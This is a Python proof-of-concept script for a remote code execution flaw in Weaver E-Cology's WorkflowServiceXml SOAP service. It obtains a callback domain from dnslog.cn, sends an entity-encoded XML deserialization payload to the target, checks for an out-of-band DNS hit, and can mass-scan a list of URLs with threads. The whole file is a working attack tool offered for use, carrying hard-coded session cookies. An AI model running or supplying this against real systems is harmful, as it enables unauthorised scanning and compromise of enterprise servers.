#!/usr/bin/python3
# coding: utf-8
import argparse
import urllib3
import threadpool
urllib3.disable_warnings()
import requests
def usage():
    print("Usage:python3 poc.py -u url")
    print("Usage:python3 poc.py -f url.txt")
def poc(target_url):
    url1 = "http://dnslog.cn:80/getdomain.php?t=0.18435905015981058"
    cookies = {"UM_distinctid": "179c82ffe71a8-099ed061c165148-445a6b-1ea000-179c82ffe725f1", "CNZZDATA1278305074": "630476539-1622557137-%7C1622557137", "PHPSESSID": "g9g5qmvbv9028tj09g6lbof5d1"}
    headers = {"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.16; rv:86.0) Gecko/20100101 Firefox/86.0", "Accept": "*/*", "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2", "Accept-Encoding": "gzip, deflate", "Connection": "close", "Referer": "http://dnslog.cn/"}
    r1=requests.get(url1, headers=headers, cookies=cookies)
    dns_location=r1.text
    vuln_url = target_url+"/services%20/WorkflowServiceXml"
    print(vuln_url)
    headers = {"Accept-Encoding": "gzip, deflate", "Content-Type": "text/xml;charset=UTF-8", "SOAPAction": "\"\"", "User-Agent": "Apache-HttpClient/4.1.1 (java 1.5)", "Connection": "close"}
    dns_para="<map>\r\n          <entry>\r\n            <url>http://"+dns_location+"</url>\r\n            <string>http://"+dns_location+"</string>\r\n          </entry>\r\n        </map>\r\n"
    html_entity=''.join(['&#{0};'.format(ord(char)) for char in dns_para])
    if "&#60" in html_entity:
        html_entity.replace('&#60','&lt')
    if "&#62" in html_entity:
        html_entity.replace('&#62','&gt')
    data = "<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:web=\"webservices.services.weaver.com.cn\">\r\n   <soapenv:Header/>\r\n   <soapenv:Body>\r\n      <web:doCreateWorkflowRequest>\r\n.      <web:string>\r\n        "+html_entity+"        </web:string>\r\n        <web:string>2</web:string>\r\n.      </web:doCreateWorkflowRequest>\r\n   </soapenv:Body>\r\n</soapenv:Envelope>"
    try:
        r=requests.post(vuln_url, headers=headers, data=data,timeout=7)
        #print(r.status_code)
    except Exception as e:
        #print (e)
        pass
    url2 = "http://dnslog.cn:80/getrecords.php"
    cookies = {"UM_distinctid": "179c82ffe71a8-099ed061c165148-445a6b-1ea000-179c82ffe725f1", "CNZZDATA1278305074": "630476539-1622557137-%7C1622557137", "PHPSESSID": "g9g5qmvbv9028tj09g6lbof5d1"}
    headers2 = {"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.16; rv:86.0) Gecko/20100101 Firefox/86.0", "Accept": "*/*", "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2", "Accept-Encoding": "gzip, deflate", "Connection": "close", "Referer": "http://dnslog.cn/"}
    r2=requests.get(url2, headers=headers2, cookies=cookies)
    #print(r2.text)
    if len(r2.text)>2:
        print("\033[1;45m [+]泛微E-Cology WorkflowServiceXml RCE漏洞! \033[0m")
def run(filename,pools=5):
    works = []
    with open(filename, "r") as f:
        for i in f:
            target_url = [i.rstrip()]
            works.append((target_url, None))
    pool = threadpool.ThreadPool(pools)
    reqs = threadpool.makeRequests(poc, works)
    [pool.putRequest(req) for req in reqs]
    pool.wait()
def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("-u",
                        "--url",
                        help="Target URL; Example:http://ip:port")
    parser.add_argument("-f",
                        "--file",
                        help="Url File; Example:url.txt")
    args = parser.parse_args()
    url = args.url
    file_path = args.file
    if url != None and file_path ==None:
        poc(url)
    elif url == None and file_path != None:
        run(file_path, 10)
if __name__ == '__main__':
    usage()
    main()
